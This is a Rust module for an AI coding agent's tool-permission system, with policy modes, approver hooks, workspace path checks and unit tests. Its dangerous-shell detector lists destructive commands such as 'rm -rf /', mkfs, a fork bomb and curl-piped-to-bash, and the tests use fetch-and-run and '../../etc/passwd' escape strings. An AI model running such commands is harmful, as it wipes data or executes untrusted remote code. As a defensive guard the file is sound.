//! Permissions: policy modes, allow/deny lists, host Approver / Authorizer (pi beforeToolCall).
//!
//! **Ask semantics:** when policy yields `Decision::Ask` and an [`Approver`] is set,
//! `authorize*` calls `Approver::approve` synchronously (may block). If that returns
//! Allow/Deny, the tool continues or stops in the same turn. Without an Approver,
//! the agent emits `ApprovalRequired` and fails the tool with `"approval required"`.
//! Use [`ChannelApprover`] for UI-driven blocking approval.

use crate::agent::ToolCall;
use serde::{Deserialize, Serialize};
use std::path::{Component, Path, PathBuf};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PermissionMode {
    FullAccess,
    ReadOnly,
    WorkspaceWrite,
    DenyAll,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Policy {
    pub mode: PermissionMode,
    #[serde(skip_serializing_if = "Vec::is_empty", default)]
    pub allowlist: Vec<String>,
    #[serde(skip_serializing_if = "Vec::is_empty", default)]
    pub denylist: Vec<String>,
    /// When true, hosts/Agent should enable OS seatbelt/bwrap for process tools.
    #[serde(default)]
    pub enable_os_sandbox: bool,
    /// Host-owned shell allow globs for process tools, e.g. `git *`, `cargo test*`.
    /// When non-empty, every shell segment must match some pattern (after deny/dangerous).
    /// Engine only matches; hosts fill the lists.
    #[serde(skip_serializing_if = "Vec::is_empty", default)]
    pub shell_allow: Vec<String>,
    /// Host-owned shell deny globs for process tools (any matching segment → Deny).
    #[serde(skip_serializing_if = "Vec::is_empty", default)]
    pub shell_deny: Vec<String>,
    /// When true (default), apply built-in dangerous-shell hard-deny under non-FullAccess.
    /// Hosts that fully own shell policy can set false and use hooks/Authorizer instead.
    #[serde(default = "default_true")]
    pub enforce_dangerous_shell: bool,
}

fn default_true() -> bool {
    true
}

impl Policy {
    pub fn full_access() -> Self {
        Self {
            mode: PermissionMode::FullAccess,
            allowlist: vec![],
            denylist: vec![],
            enable_os_sandbox: false,
            shell_allow: vec![],
            shell_deny: vec![],
            enforce_dangerous_shell: true,
        }
    }
    pub fn read_only() -> Self {
        Self {
            mode: PermissionMode::ReadOnly,
            allowlist: vec![],
            denylist: vec![],
            enable_os_sandbox: false,
            shell_allow: vec![],
            shell_deny: vec![],
            enforce_dangerous_shell: true,
        }
    }
    pub fn workspace_write() -> Self {
        Self {
            mode: PermissionMode::WorkspaceWrite,
            allowlist: vec![],
            denylist: vec![],
            enable_os_sandbox: true,
            shell_allow: vec![],
            shell_deny: vec![],
            enforce_dangerous_shell: true,
        }
    }
    pub fn deny_all() -> Self {
        Self {
            mode: PermissionMode::DenyAll,
            allowlist: vec![],
            denylist: vec![],
            enable_os_sandbox: false,
            shell_allow: vec![],
            shell_deny: vec![],
            enforce_dangerous_shell: true,
        }
    }

    /// Enable or disable OS sandbox plugin flag (seatbelt/bwrap).
    pub fn with_os_sandbox(mut self, enabled: bool) -> Self {
        self.enable_os_sandbox = enabled;
        self
    }

    pub fn with_shell_allow(
        mut self,
        patterns: impl IntoIterator<Item = impl Into<String>>,
    ) -> Self {
        self.shell_allow = patterns.into_iter().map(Into::into).collect();
        self
    }

    pub fn with_shell_deny(
        mut self,
        patterns: impl IntoIterator<Item = impl Into<String>>,
    ) -> Self {
        self.shell_deny = patterns.into_iter().map(Into::into).collect();
        self
    }

    pub fn with_enforce_dangerous_shell(mut self, enabled: bool) -> Self {
        self.enforce_dangerous_shell = enabled;
        self
    }

    /// Apply a scope/profile policy's mode (+ sandbox flag) without wiping host-owned fields.
    /// Preserves: `shell_allow`, `shell_deny`, `enforce_dangerous_shell`, `allowlist`, `denylist`.
    pub fn apply_scope(&mut self, scope_policy: &Policy) {
        self.mode = scope_policy.mode;
        self.enable_os_sandbox = scope_policy.enable_os_sandbox;
    }

    /// Builder form of [`Self::apply_scope`].
    pub fn with_scope(mut self, scope_policy: &Policy) -> Self {
        self.apply_scope(scope_policy);
        self
    }
}

impl Default for Policy {
    /// Secure default matches `Agent::new` — not full access.
    fn default() -> Self {
        Self::workspace_write()
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Decision {
    Allow,
    Deny,
    Ask,
}

/// Rich approval payload for host UX (Codex-style ask).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApprovalRequest {
    pub call_id: String,
    pub tool_name: String,
    pub arguments: String,
    pub reason: String,
    pub policy_mode: String,
    pub is_process_tool: bool,
    pub is_write_tool: bool,
}

impl ApprovalRequest {
    pub fn from_call(call: &ToolCall, policy: &Policy) -> Self {
        let name = call.name.as_str();
        Self {
            call_id: call.id.clone(),
            tool_name: call.name.clone(),
            arguments: call.arguments.clone(),
            reason: format!(
                "policy {:?} requires approval for tool `{name}`",
                policy.mode
            ),
            policy_mode: format!("{:?}", policy.mode),
            is_process_tool: is_process_tool(name),
            is_write_tool: is_write_tool(name),
        }
    }
}

/// Approver trait — hosts implement this to prompt the user (codex-rs pattern).
pub trait Approver: Send + Sync {
    fn approve(&self, tool_call: &ToolCall) -> Decision;
}

/// Always-allow approver (for testing / yolo mode).
pub struct AlwaysAllow;
impl Approver for AlwaysAllow {
    fn approve(&self, _call: &ToolCall) -> Decision {
        Decision::Allow
    }
}

/// Always-deny approver.
pub struct AlwaysDeny;
impl Approver for AlwaysDeny {
    fn approve(&self, _call: &ToolCall) -> Decision {
        Decision::Deny
    }
}

/// Blocking approver for hosts: sends each pending tool call on a channel and waits
/// for a [`Decision`]. Pair with a UI thread that receives and replies.
///
/// ```ignore
/// let (approver, rx) = ChannelApprover::pair();
/// agent.set_approver(Arc::new(approver));
/// // UI thread:
/// let (call, reply) = rx.recv().unwrap();
/// reply.send(Decision::Allow).ok();
/// ```
pub struct ChannelApprover {
    tx: parking_lot::Mutex<std::sync::mpsc::Sender<(ToolCall, std::sync::mpsc::Sender<Decision>)>>,
}

impl ChannelApprover {
    /// Create approver + receiver of `(ToolCall, reply_tx)`.
    pub fn pair() -> (
        Self,
        std::sync::mpsc::Receiver<(ToolCall, std::sync::mpsc::Sender<Decision>)>,
    ) {
        let (tx, rx) = std::sync::mpsc::channel();
        (
            Self {
                tx: parking_lot::Mutex::new(tx),
            },
            rx,
        )
    }
}

impl Approver for ChannelApprover {
    fn approve(&self, tool_call: &ToolCall) -> Decision {
        let (reply_tx, reply_rx) = std::sync::mpsc::channel();
        if self.tx.lock().send((tool_call.clone(), reply_tx)).is_err() {
            return Decision::Deny;
        }
        reply_rx.recv().unwrap_or(Decision::Deny)
    }
}

/// Async host Approver (pi `beforeToolCall` is Promise/async). Prefer for non-blocking UI.
#[async_trait::async_trait]
pub trait AsyncApprover: Send + Sync {
    async fn approve(&self, tool_call: &ToolCall) -> Decision;
}

/// Tokio mpsc + oneshot Approver (async ChannelApprover).
pub struct ChannelAsyncApprover {
    tx: tokio::sync::mpsc::Sender<(ToolCall, tokio::sync::oneshot::Sender<Decision>)>,
}

impl ChannelAsyncApprover {
    pub fn pair() -> (
        Self,
        tokio::sync::mpsc::Receiver<(ToolCall, tokio::sync::oneshot::Sender<Decision>)>,
    ) {
        let (tx, rx) = tokio::sync::mpsc::channel(32);
        (Self { tx }, rx)
    }
}

#[async_trait::async_trait]
impl AsyncApprover for ChannelAsyncApprover {
    async fn approve(&self, tool_call: &ToolCall) -> Decision {
        let (reply_tx, reply_rx) = tokio::sync::oneshot::channel();
        if self.tx.send((tool_call.clone(), reply_tx)).await.is_err() {
            return Decision::Deny;
        }
        reply_rx.await.unwrap_or(Decision::Deny)
    }
}

/// Pluggable pre-tool gate (pi `beforeToolCall` shape).
/// Engine calls this before executing tools; hosts supply product policy.
pub trait Authorizer: Send + Sync {
    fn authorize(
        &self,
        tool_name: &str,
        arguments: &str,
        approver: Option<&dyn Approver>,
        workspace_root: Option<&Path>,
    ) -> Decision;
}

/// Default authorizer: evaluates [`Policy`] (modes, lists, host shell globs, optional dangerous deny).
#[derive(Debug, Clone)]
pub struct PolicyAuthorizer {
    pub policy: Policy,
}

impl PolicyAuthorizer {
    pub fn new(policy: Policy) -> Self {
        Self { policy }
    }
}

impl Authorizer for PolicyAuthorizer {
    fn authorize(
        &self,
        tool_name: &str,
        arguments: &str,
        approver: Option<&dyn Approver>,
        workspace_root: Option<&Path>,
    ) -> Decision {
        authorize_with_workspace(&self.policy, tool_name, arguments, approver, workspace_root)
    }
}

/// True when `path` escapes `workspace_root` (absolute or after `..` resolution).
pub fn path_outside_workspace(workspace_root: &Path, path: &str) -> bool {
    let p = Path::new(path);
    let joined = if p.is_absolute() {
        p.to_path_buf()
    } else {
        workspace_root.join(p)
    };
    let canon = normalize_lexically(&joined);
    let root = normalize_lexically(workspace_root);
    !canon.starts_with(&root)
}

fn normalize_lexically(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for c in path.components() {
        match c {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

fn path_from_args(arguments: &str) -> Option<String> {
    let v: serde_json::Value = serde_json::from_str(arguments).ok()?;
    for key in ["path", "file", "file_path"] {
        if let Some(s) = v.get(key).and_then(|x| x.as_str()) {
            return Some(s.to_string());
        }
    }
    None
}

pub fn authorize(
    policy: &Policy,
    tool_name: &str,
    arguments: &str,
    approver: Option<&dyn Approver>,
) -> Decision {
    authorize_with_workspace(policy, tool_name, arguments, approver, None)
}

pub fn authorize_with_workspace(
    policy: &Policy,
    tool_name: &str,
    arguments: &str,
    approver: Option<&dyn Approver>,
    workspace_root: Option<&Path>,
) -> Decision {
    if policy.denylist.iter().any(|d| d == tool_name) {
        return Decision::Deny;
    }
    if !policy.allowlist.is_empty() {
        if policy.allowlist.iter().any(|a| a == tool_name) {
            return Decision::Allow;
        }
        return Decision::Deny;
    }

    if matches!(
        policy.mode,
        PermissionMode::WorkspaceWrite | PermissionMode::ReadOnly
    ) && is_write_tool(tool_name)
    {
        if let (Some(root), Some(path)) = (workspace_root, path_from_args(arguments)) {
            if path_outside_workspace(root, &path) {
                return Decision::Deny;
            }
        }
    }

    if is_process_tool(tool_name) && policy.mode != PermissionMode::FullAccess {
        if let Some(cmd) = command_from_args(arguments) {
            if policy.enforce_dangerous_shell && is_dangerous_shell_command(&cmd) {
                return Decision::Deny;
            }
            // Deny: any segment matches any deny pattern.
            if !policy.shell_deny.is_empty() && shell_command_matches_any(&cmd, &policy.shell_deny)
            {
                return Decision::Deny;
            }
            // Allow: every segment matches some allow pattern (host-owned lists).
            if !policy.shell_allow.is_empty()
                && shell_command_matches_all(&cmd, &policy.shell_allow)
            {
                return Decision::Allow;
            }
        }
    }

    let mode_decision = match policy.mode {
        PermissionMode::FullAccess => Decision::Allow,
        PermissionMode::DenyAll => Decision::Deny,
        PermissionMode::ReadOnly => {
            if is_read_only_tool(tool_name) {
                Decision::Allow
            } else {
                Decision::Ask
            }
        }
        PermissionMode::WorkspaceWrite => {
            // Read + workspace write tools auto-allow; bash/process and other tools Ask.
            if is_read_only_tool(tool_name) || is_write_tool(tool_name) {
                Decision::Allow
            } else {
                Decision::Ask
            }
        }
    };
    if mode_decision == Decision::Ask {
        if let Some(app) = approver {
            let call = ToolCall {
                id: String::new(),
                name: tool_name.to_string(),
                arguments: arguments.to_string(),
            };
            return app.approve(&call);
        }
    }
    mode_decision
}

pub fn is_read_only_tool(name: &str) -> bool {
    matches!(
        name,
        "read"
            | "read_file"
            | "ls"
            | "list_dir"
            | "find"
            | "find_files"
            | "grep"
            | "code_intel"
            | "cu_see"
            | "cu_image"
            | "cu_list"
            | "web_fetch"
            | "enter_plan_mode"
            | "exit_plan_mode"
    ) || name.starts_with("lsp_")
}

/// Returns true when the tool mutates workspace files (write/edit family).
pub fn is_write_tool(name: &str) -> bool {
    matches!(
        name,
        "write"
            | "write_file"
            | "edit"
            | "hashline_edit"
            | "search_replace"
            | "apply_patch"
            | "todo"
    )
}

/// Returns true when the tool is a shell/process executor.
pub fn is_process_tool(name: &str) -> bool {
    matches!(name, "bash" | "run_command" | "spawn_agent")
}

pub fn command_from_args(arguments: &str) -> Option<String> {
    let v: serde_json::Value = serde_json::from_str(arguments).ok()?;
    for key in ["command", "cmd"] {
        if let Some(s) = v.get(key).and_then(|x| x.as_str()) {
            return Some(s.to_string());
        }
    }
    None
}

/// Glob-ish match: `*` = any substring, case-sensitive on remaining parts.
pub fn shell_rule_matches(pattern: &str, command: &str) -> bool {
    shell_segments(command)
        .into_iter()
        .any(|seg| shell_rule_matches_segment(pattern, &seg))
}

fn shell_rule_matches_segment(pattern: &str, command: &str) -> bool {
    let cmd = command.trim();
    let pat = pattern.trim();
    if pat.is_empty() {
        return false;
    }
    if pat == "*" {
        return true;
    }
    if !pat.contains('*') {
        return cmd == pat || cmd.starts_with(&format!("{pat} "));
    }
    let parts: Vec<&str> = pat.split('*').collect();
    let mut rest = cmd;
    if let Some(first) = parts.first() {
        if !first.is_empty() {
            if !rest.starts_with(first) {
                return false;
            }
            rest = &rest[first.len()..];
        }
    }
    for (i, part) in parts.iter().enumerate().skip(1) {
        if part.is_empty() {
            if i == parts.len() - 1 {
                return true;
            }
            continue;
        }
        if let Some(idx) = rest.find(part) {
            rest = &rest[idx + part.len()..];
        } else {
            return false;
        }
    }
    true
}

/// True if any pattern matches the command (segment-aware via [`shell_rule_matches`]).
pub fn shell_command_allowed(command: &str, patterns: &[String]) -> bool {
    shell_command_matches_any(command, patterns)
}

/// True if any shell segment matches any pattern (deny semantics).
pub fn shell_command_matches_any(command: &str, patterns: &[String]) -> bool {
    patterns.iter().any(|p| shell_rule_matches(p, command))
}

/// True if every shell segment matches at least one pattern (allow semantics).
pub fn shell_command_matches_all(command: &str, patterns: &[String]) -> bool {
    let segs = shell_segments(command);
    if segs.is_empty() {
        return false;
    }
    segs.iter()
        .all(|seg| patterns.iter().any(|p| shell_rule_matches_segment(p, seg)))
}

/// Split on shell list/pipe operators outside quotes (`|`, `||`, `&`, `&&`, `;`).
pub fn shell_segments(command: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut chars = command.chars().peekable();
    let mut quote: Option<char> = None;
    let mut escaped = false;
    while let Some(c) = chars.next() {
        if escaped {
            cur.push(c);
            escaped = false;
            continue;
        }
        if quote.is_none() && c == '\\' {
            cur.push(c);
            escaped = true;
            continue;
        }
        if let Some(q) = quote {
            cur.push(c);
            if c == q {
                quote = None;
            }
            continue;
        }
        if c == '\'' || c == '"' {
            quote = Some(c);
            cur.push(c);
            continue;
        }
        if c == ';' {
            push_seg(&mut out, &mut cur);
            continue;
        }
        if c == '|' || c == '&' {
            let doubled = chars.peek() == Some(&c);
            if doubled {
                chars.next();
            }
            push_seg(&mut out, &mut cur);
            continue;
        }
        cur.push(c);
    }
    push_seg(&mut out, &mut cur);
    if out.is_empty() {
        out.push(command.trim().to_string());
    }
    out
}

fn push_seg(out: &mut Vec<String>, cur: &mut String) {
    let s = cur.trim();
    if !s.is_empty() {
        out.push(s.to_string());
    }
    cur.clear();
}

/// One simple command as argv (quote-aware; no expansions).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellSimple {
    pub argv: Vec<String>,
}

impl ShellSimple {
    pub fn binary(&self) -> Option<&str> {
        self.argv.first().map(|s| s.as_str())
    }
}

/// Lightweight shell AST (not full bash).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ShellNode {
    Pipeline(Vec<ShellSimple>),
    List(Vec<ShellNode>),
}

/// Parse into pipelines of simple commands (quote-aware).
pub fn shell_ast(command: &str) -> ShellNode {
    let segs = shell_segments(command);
    if segs.is_empty() {
        return ShellNode::List(vec![]);
    }
    let mut pipes = Vec::new();
    for seg in segs {
        let simples: Vec<ShellSimple> = split_pipeline(&seg)
            .into_iter()
            .map(|s| ShellSimple {
                argv: shell_argv(&s),
            })
            .filter(|s| !s.argv.is_empty())
            .collect();
        if !simples.is_empty() {
            pipes.push(ShellNode::Pipeline(simples));
        }
    }
    if pipes.len() == 1 {
        pipes.pop().unwrap()
    } else {
        ShellNode::List(pipes)
    }
}

fn split_pipeline(segment: &str) -> Vec<String> {
    // shell_segments already split on `|`; residual single piece.
    vec![segment.trim().to_string()]
}

/// Quote-aware argv split (whitespace outside quotes).
#[allow(clippy::while_let_on_iterator)]
pub fn shell_argv(command: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut chars = command.chars().peekable();
    let mut quote: Option<char> = None;
    let mut escaped = false;
    #[allow(clippy::while_let_on_iterator)]
    while let Some(c) = chars.next() {
        if escaped {
            cur.push(c);
            escaped = false;
            continue;
        }
        if quote.is_none() && c == '\\' {
            escaped = true;
            continue;
        }
        if let Some(q) = quote {
            if c == q {
                quote = None;
            } else {
                cur.push(c);
            }
            continue;
        }
        if c == '\'' || c == '"' {
            quote = Some(c);
            continue;
        }
        if c.is_whitespace() {
            if !cur.is_empty() {
                out.push(std::mem::take(&mut cur));
            }
            continue;
        }
        cur.push(c);
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

/// Flatten AST to simple commands in order.
pub fn shell_simples(command: &str) -> Vec<ShellSimple> {
    fn walk(n: &ShellNode, out: &mut Vec<ShellSimple>) {
        match n {
            ShellNode::Pipeline(steps) => out.extend(steps.iter().cloned()),
            ShellNode::List(items) => {
                for i in items {
                    walk(i, out);
                }
            }
        }
    }
    let mut out = Vec::new();
    walk(&shell_ast(command), &mut out);
    out
}

/// Hard-deny shell patterns under non-FullAccess modes (escape / wipe / remote pipe).
pub fn is_dangerous_shell_command(command: &str) -> bool {
    let segs = shell_segments(command);
    for seg in &segs {
        let lower = seg.to_ascii_lowercase();
        if is_rm_rf_root(&lower) {
            return true;
        }
        const PATTERNS: &[&str] = &[
            "mkfs.",
            "mkfs ",
            "dd if=",
            ":(){ :|:& };:",
            "/dev/sda",
            "chmod -r 777 /",
            "chmod -r 777/*",
            "chown -r root /",
            "chown -r /",
        ];
        if PATTERNS.iter().any(|p| lower.contains(p)) {
            return true;
        }
    }
    // curl/wget piped to shell across quote-aware segments.
    let mut saw_fetch = false;
    for seg in &segs {
        let lower = seg.to_ascii_lowercase();
        let first = lower.split_whitespace().next().unwrap_or("");
        if first == "curl" || first == "wget" {
            saw_fetch = true;
            continue;
        }
        if saw_fetch && matches!(first, "sh" | "bash" | "zsh" | "dash") {
            return true;
        }
        // non-fetch segment resets chain unless still a fetch
        if first != "curl" && first != "wget" {
            saw_fetch = false;
        }
    }
    false
}

/// True for `rm -rf /` / `rm -rf /*` style root wipes, not `rm -rf /tmp/...`.
fn is_rm_rf_root(cmd: &str) -> bool {
    let Some(idx) = cmd.find("rm -rf /") else {
        return cmd.contains("rm -rf /*");
    };
    let after = &cmd[idx + "rm -rf /".len()..];
    after.is_empty()
        || after.starts_with('*')
        || after.starts_with(' ')
        || after.starts_with(';')
        || after.starts_with('&')
        || after.starts_with('|')
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    #[test]
    fn full_access_allows() {
        assert_eq!(
            authorize(&Policy::full_access(), "write", "{}", None),
            Decision::Allow
        );
    }

    #[test]
    fn default_is_workspace_write() {
        assert_eq!(Policy::default().mode, PermissionMode::WorkspaceWrite);
        assert_eq!(
            authorize(&Policy::default(), "bash", "{}", None),
            Decision::Ask
        );
    }

    #[test]
    fn deny_all_blocks() {
        assert_eq!(
            authorize(&Policy::deny_all(), "read", "{}", None),
            Decision::Deny
        );
    }

    #[test]
    fn denylist_overrides() {
        let p = Policy {
            mode: PermissionMode::FullAccess,
            allowlist: vec![],
            denylist: vec!["bash".into()],
            enable_os_sandbox: false,
            shell_allow: vec![],
            shell_deny: vec![],
            enforce_dangerous_shell: true,
        };
        assert_eq!(authorize(&p, "bash", "{}", None), Decision::Deny);
    }

    #[test]
    fn read_only_allows_reads() {
        assert_eq!(
            authorize(&Policy::read_only(), "read", "{}", None),
            Decision::Allow
        );
        assert_eq!(
            authorize(&Policy::read_only(), "write", "{}", None),
            Decision::Ask
        );
    }

    #[test]
    fn approver_called_on_ask() {
        assert_eq!(
            authorize(&Policy::read_only(), "write", "{}", Some(&AlwaysAllow)),
            Decision::Allow
        );
        assert_eq!(
            authorize(&Policy::read_only(), "write", "{}", Some(&AlwaysDeny)),
            Decision::Deny
        );
    }

    #[test]
    fn workspace_write_allows_edit_asks_bash() {
        assert_eq!(
            authorize(&Policy::workspace_write(), "read", "{}", None),
            Decision::Allow
        );
        assert_eq!(
            authorize(&Policy::workspace_write(), "edit", "{}", None),
            Decision::Allow
        );
        assert_eq!(
            authorize(&Policy::workspace_write(), "write", "{}", None),
            Decision::Allow
        );
        assert_eq!(
            authorize(&Policy::workspace_write(), "bash", "{}", None),
            Decision::Ask
        );
        assert_eq!(
            authorize(&Policy::workspace_write(), "unknown_tool", "{}", None),
            Decision::Ask
        );
    }

    struct CaptureApprover {
        seen: Mutex<Option<ToolCall>>,
    }

    impl Approver for CaptureApprover {
        fn approve(&self, call: &ToolCall) -> Decision {
            *self.seen.lock().unwrap() = Some(call.clone());
            Decision::Allow
        }
    }

    #[test]
    fn approver_sees_real_arguments() {
        let app = CaptureApprover {
            seen: Mutex::new(None),
        };
        let args = r#"{"path":"secret.txt","content":"x"}"#;
        assert_eq!(
            authorize(&Policy::read_only(), "write", args, Some(&app)),
            Decision::Allow
        );
        let seen = app.seen.lock().unwrap().clone().expect("approver called");
        assert_eq!(seen.name, "write");
        assert_eq!(seen.arguments, args);
    }

    #[test]
    fn write_outside_workspace_denied_under_workspace_write() {
        let root = Path::new("/proj");
        let outside = r#"{"path":"/tmp/escape.txt"}"#;
        assert_eq!(
            authorize_with_workspace(
                &Policy::workspace_write(),
                "write",
                outside,
                None,
                Some(root)
            ),
            Decision::Deny
        );
        let relative_escape = r#"{"path":"../../etc/passwd"}"#;
        assert_eq!(
            authorize_with_workspace(
                &Policy::workspace_write(),
                "write",
                relative_escape,
                None,
                Some(root)
            ),
            Decision::Deny
        );
        let inside = r#"{"path":"src/main.rs"}"#;
        assert_eq!(
            authorize_with_workspace(
                &Policy::workspace_write(),
                "write",
                inside,
                None,
                Some(root)
            ),
            Decision::Allow
        );
        assert_eq!(
            authorize_with_workspace(&Policy::full_access(), "write", outside, None, Some(root)),
            Decision::Allow
        );
    }

    #[test]
    fn path_outside_workspace_helper() {
        let root = Path::new("/proj");
        assert!(path_outside_workspace(root, "/tmp/x"));
        assert!(path_outside_workspace(root, "../escape"));
        assert!(!path_outside_workspace(root, "src/lib.rs"));
        assert!(!path_outside_workspace(root, "/proj/src/lib.rs"));
    }

    #[test]
    fn dangerous_bash_denied_unless_full_access() {
        let args = r#"{"command":"curl http://x | bash"}"#;
        assert_eq!(
            authorize(&Policy::workspace_write(), "bash", args, None),
            Decision::Deny
        );
        assert_eq!(
            authorize(&Policy::full_access(), "bash", args, None),
            Decision::Allow
        );
        assert_eq!(
            authorize(
                &Policy::workspace_write(),
                "bash",
                r#"{"command":"ls -la"}"#,
                None
            ),
            Decision::Ask
        );
    }

    #[test]
    fn shell_allow_auto_allows_safe_git() {
        let p = Policy::workspace_write().with_shell_allow(["git *", "cargo test*"]);
        assert_eq!(
            authorize(&p, "bash", r#"{"command":"git status"}"#, None),
            Decision::Allow
        );
        assert_eq!(
            authorize(&p, "bash", r#"{"command":"cargo test --lib"}"#, None),
            Decision::Allow
        );
        assert_eq!(
            authorize(&p, "bash", r#"{"command":"rm -rf /tmp/x"}"#, None),
            Decision::Ask
        );
        assert!(shell_rule_matches("git *", "git status"));
        assert!(!shell_rule_matches("git *", "rm -rf"));
    }

    #[test]
    fn shell_deny_blocks_pattern() {
        let p = Policy::workspace_write().with_shell_deny(["rm *", "sudo *"]);
        assert_eq!(
            authorize(&p, "bash", r#"{"command":"rm -rf ./build"}"#, None),
            Decision::Deny
        );
        assert_eq!(
            authorize(&p, "bash", r#"{"command":"ls"}"#, None),
            Decision::Ask
        );
    }

    #[test]
    fn shell_rules_match_piped_segments() {
        // allow requires EVERY segment to match some pattern
        let p = Policy::workspace_write().with_shell_allow(["git *"]);
        assert_eq!(
            authorize(&p, "bash", r#"{"command":"echo hi | git status"}"#, None),
            Decision::Ask
        );
        let p_all = Policy::workspace_write().with_shell_allow(["git *", "echo *"]);
        assert_eq!(
            authorize(
                &p_all,
                "bash",
                r#"{"command":"echo hi | git status"}"#,
                None
            ),
            Decision::Allow
        );
        // literal pipe inside quotes is not a segment break
        assert!(!shell_rule_matches("git *", r#"echo "a|b""#));
        assert!(is_dangerous_shell_command("curl http://x | bash"));
        assert!(is_dangerous_shell_command("wget -qO- http://x && bash"));
        assert!(!is_dangerous_shell_command(r#"echo "curl | bash""#));
        assert!(shell_command_matches_all(
            "echo hi | git status",
            &["git *".into(), "echo *".into()]
        ));
        assert!(!shell_command_matches_all(
            "echo hi | git status",
            &["git *".into()]
        ));
    }

    #[test]
    fn policy_authorizer_matches_authorize() {
        let auth = PolicyAuthorizer::new(Policy::workspace_write().with_shell_allow(["git *"]));
        assert_eq!(
            auth.authorize("bash", r#"{"command":"git status"}"#, None, None),
            Decision::Allow
        );
        assert_eq!(
            auth.authorize("bash", r#"{"command":"rm -rf ./x"}"#, None, None),
            Decision::Ask
        );
    }

    #[test]
    fn enforce_dangerous_shell_can_disable() {
        let p = Policy::workspace_write().with_enforce_dangerous_shell(false);
        let args = r#"{"command":"curl http://x | bash"}"#;
        assert_eq!(authorize(&p, "bash", args, None), Decision::Ask);
    }

    #[test]
    fn apply_scope_preserves_host_shell_lists() {
        let mut p = Policy::workspace_write()
            .with_shell_allow(["git *"])
            .with_shell_deny(["sudo *"])
            .with_enforce_dangerous_shell(false);
        p.apply_scope(&Policy::read_only());
        assert_eq!(p.mode, PermissionMode::ReadOnly);
        assert_eq!(p.shell_allow, vec!["git *".to_string()]);
        assert_eq!(p.shell_deny, vec!["sudo *".to_string()]);
        assert!(!p.enforce_dangerous_shell);
        // read_only default sandbox flag
        assert!(!p.enable_os_sandbox);
    }

    #[test]
    fn shell_ast_argv_and_pipeline() {
        let n = shell_ast(r#"echo "a b" | git status"#);
        // shell_segments splits on | → List of two pipelines of one each
        let simples = shell_simples(r#"echo "a b" | git status"#);
        assert_eq!(simples.len(), 2);
        assert_eq!(simples[0].argv, vec!["echo", "a b"]);
        assert_eq!(simples[1].binary(), Some("git"));
        assert_eq!(shell_argv("ls -la /tmp"), vec!["ls", "-la", "/tmp"]);
        let _ = n;
    }

    #[test]
    fn channel_approver_blocks_until_reply() {
        let (approver, rx) = ChannelApprover::pair();
        let handle = std::thread::spawn(move || {
            let (call, reply) = rx.recv().expect("request");
            assert_eq!(call.name, "bash");
            reply.send(Decision::Allow).unwrap();
        });
        let call = ToolCall {
            id: "1".into(),
            name: "bash".into(),
            arguments: r#"{"command":"true"}"#.into(),
        };
        assert_eq!(approver.approve(&call), Decision::Allow);
        handle.join().unwrap();

        // no receiver → Deny
        let (approver2, rx2) = ChannelApprover::pair();
        drop(rx2);
        assert_eq!(approver2.approve(&call), Decision::Deny);
    }
}
